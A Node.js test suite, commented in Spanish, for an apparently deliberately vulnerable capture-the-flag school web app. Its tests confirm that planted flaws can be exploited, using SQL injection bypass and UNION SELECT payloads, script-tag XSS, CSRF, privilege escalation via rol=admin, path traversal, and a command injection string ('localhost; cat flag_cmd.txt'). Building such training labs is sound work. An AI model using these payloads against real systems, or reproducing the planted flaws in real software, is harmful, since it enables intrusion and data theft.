'use strict';
const { test, describe, before, after } = require('node:test');
const assert = require('node:assert');
const request = require('supertest');
const { resetDb } = require('../db');

// Resetear la DB antes de cada ejecución para que los tests sean idempotentes
let app;
before(() => {
  resetDb();
  app = require('../server');
});

describe('Database seed', () => {
  test('usuarios seed cargado correctamente', async () => {
    const res = await request(app)
      .get('/api/users');
    assert.equal(res.status, 200);
    const usernames = res.body.users.map(u => u.username);
    assert.ok(usernames.includes('admin'));
    assert.ok(usernames.includes('prof_garcia'));
    assert.ok(usernames.includes('alumno_lopez'));
    assert.ok(usernames.includes('alumno_perez'));
  });
});

describe('Autenticación', () => {
  test('Login con credenciales válidas retorna rol y nombre', async () => {
    const res = await request(app)
      .post('/login')
      .send({ username: 'alumno_lopez', password: 'alumno123' });
    assert.equal(res.status, 200);
    assert.equal(res.body.rol, 'alumno');
    assert.ok(res.body.nombre);
  });

  test('Login con contraseña incorrecta retorna 401', async () => {
    const res = await request(app)
      .post('/login')
      .send({ username: 'alumno_lopez', password: 'wrong' });
    assert.equal(res.status, 401);
  });
});

describe('VULN 1 — SQL Injection en login', () => {
  test("Payload ' OR '1'='1' -- hace bypass y revela FLAG{sql_1nj3ct10n}", async () => {
    const res = await request(app)
      .post('/login')
      .send({ username: "' OR '1'='1' --", password: 'irrelevante' });
    assert.equal(res.status, 200);
    assert.equal(res.body.flag, 'FLAG{sql_1nj3ct10n}');
    assert.ok(res.body.debug, 'Debe incluir la query ejecutada');
  });
});

describe('VULN 1b — SQL Injection en /search (UNION SELECT)', () => {
  let cookie;
  before(async () => {
    const res = await request(app).post('/login').send({ username: 'alumno_lopez', password: 'alumno123' });
    cookie = res.headers['set-cookie'];
  });

  test('Búsqueda normal retorna usuarios', async () => {
    const res = await request(app).get('/search?q=Lopez').set('Cookie', cookie);
    assert.equal(res.status, 200);
    assert.ok(Array.isArray(res.body.results));
    assert.ok(res.body.results.length > 0);
  });

  test('UNION SELECT extrae tabla flags y muestra FLAG{sql_1nj3ct10n}', async () => {
    const payload = encodeURIComponent("' UNION SELECT id, flag, flag, flag, flag FROM flags --");
    const res = await request(app).get(`/search?q=${payload}`).set('Cookie', cookie);
    assert.equal(res.status, 200);
    const valores = res.body.results.flatMap(r => Object.values(r));
    assert.ok(valores.some(v => String(v).includes('FLAG{')), 'La flag debe aparecer en los resultados');
  });

  test('/search sin sesión retorna 401', async () => {
    const res = await request(app).get('/search?q=test');
    assert.equal(res.status, 401);
  });
});

describe('VULN 6 — Exposición de datos sensibles', () => {
  test('/api/users retorna usuarios con hashes sin requerir autenticación', async () => {
    const res = await request(app).get('/api/users');
    assert.equal(res.status, 200);
    assert.ok(Array.isArray(res.body.users));
    assert.ok(res.body.users.every(u => u.password), 'Los hashes deben estar expuestos');
    assert.equal(res.body.flag, 'FLAG{s3ns1t1v3_d4t4}');
  });

  test('/db.sqlite es descargable sin autenticación', async () => {
    const res = await request(app).get('/db.sqlite');
    assert.ok(res.status === 200 || res.status === 304);
  });
});

describe('VULN 3 — XSS Stored y Reflected', () => {
  let cookie;
  before(async () => {
    const res = await request(app).post('/login').send({ username: 'alumno_lopez', password: 'alumno123' });
    cookie = res.headers['set-cookie'];
  });

  test('POST /messages guarda contenido sin sanitizar (XSS Stored)', async () => {
    const payload = '<script>alert("xss")</script>';
    const post = await request(app).post('/messages').set('Cookie', cookie).send({ contenido: payload });
    assert.equal(post.status, 200);

    const get = await request(app).get('/messages').set('Cookie', cookie);
    assert.ok(get.text.includes(payload), 'El payload XSS debe aparecer sin escapar en la respuesta HTML');
  });

  test('GET /messages?msg= refleja parámetro sin sanitizar (XSS Reflected)', async () => {
    const payload = '<script>alert(1)</script>';
    const res = await request(app)
      .get(`/messages?msg=${encodeURIComponent(payload)}`)
      .set('Cookie', cookie);
    assert.ok(res.text.includes(payload), 'El parámetro msg debe reflejarse sin escapar');
  });

  test('GET /api/xss-flag retorna FLAG{xss_st0r3d} con sesión activa', async () => {
    const res = await request(app).get('/api/xss-flag').set('Cookie', cookie);
    assert.equal(res.status, 200);
    assert.equal(res.body.flag, 'FLAG{xss_st0r3d}');
  });
});

describe('VULN 4 — CSRF en cambio de contraseña', () => {
  let cookie;
  before(async () => {
    const res = await request(app).post('/login').send({ username: 'alumno_perez', password: 'alumno456' });
    cookie = res.headers['set-cookie'];
  });

  test('POST /profile/update acepta cambio de contraseña sin token CSRF y retorna flag', async () => {
    const res = await request(app)
      .post('/profile/update')
      .set('Cookie', cookie)
      .send({ password: 'nueva123' });
    assert.equal(res.status, 200);
    assert.equal(res.body.csrf_flag, 'FLAG{csrf_4tt4ck}');
  });
});

describe('VULN 7 — Escalación de privilegios vertical', () => {
  let cookie;
  before(async () => {
    // Usar alumno_lopez (contraseña nunca modificada por otros tests)
    const res = await request(app).post('/login').send({ username: 'alumno_lopez', password: 'alumno123' });
    cookie = res.headers['set-cookie'];
  });

  test('Alumno puede cambiar su propio rol a admin enviando rol=admin', async () => {
    const res = await request(app)
      .post('/profile/update')
      .set('Cookie', cookie)
      .send({ rol: 'admin' });
    assert.equal(res.status, 200);
    assert.equal(res.body.flag, 'FLAG{pr1v_3sc4l4t10n}');
  });
});

describe('VULN 5 — File Inclusion / Path Traversal', () => {
  let cookie;
  before(async () => {
    const res = await request(app).post('/login').send({ username: 'alumno_lopez', password: 'alumno123' });
    cookie = res.headers['set-cookie'];
  });

  test('Descarga normal de material funciona', async () => {
    const res = await request(app).get('/download?file=temario_u1.txt').set('Cookie', cookie);
    assert.equal(res.status, 200);
    assert.ok(res.body.content.includes('TEMARIO'));
  });

  test('Path traversal ../../secret_lfi.txt revela FLAG{f1l3_1nclus10n}', async () => {
    const payload = encodeURIComponent('../../secret_lfi.txt');
    const res = await request(app).get(`/download?file=${payload}`).set('Cookie', cookie);
    assert.equal(res.status, 200);
    assert.equal(res.body.flag, 'FLAG{f1l3_1nclus10n}');
    assert.ok(res.body.content.includes('FLAG{f1l3_1nclus10n}'));
  });
});

describe('VULN 2 — Command Injection en /admin/ping', () => {
  let cookie;
  before(async () => {
    // Cualquier usuario autenticado puede acceder (insufficient access control)
    const res = await request(app).post('/login').send({ username: 'alumno_lopez', password: 'alumno123' });
    cookie = res.headers['set-cookie'];
  });

  test('Ping normal a localhost retorna output', async () => {
    const res = await request(app).get('/admin/ping?host=localhost').set('Cookie', cookie);
    assert.equal(res.status, 200);
    assert.ok(res.body.output);
  });

  test('Payload con ; cat flag_cmd.txt revela FLAG{cmd_1nj3ct10n}', (_, done) => {
    const payload = encodeURIComponent('localhost; cat flag_cmd.txt');
    request(app)
      .get(`/admin/ping?host=${payload}`)
      .set('Cookie', cookie)
      .then(res => {
        assert.equal(res.status, 200);
        assert.ok(res.body.output.includes('FLAG{cmd_1nj3ct10n}'), `Output fue: ${res.body.output}`);
        done();
      })
      .catch(done);
  });

  test('/admin/ping sin sesión retorna 401', async () => {
    const res = await request(app).get('/admin/ping?host=localhost');
    assert.equal(res.status, 401);
  });
});
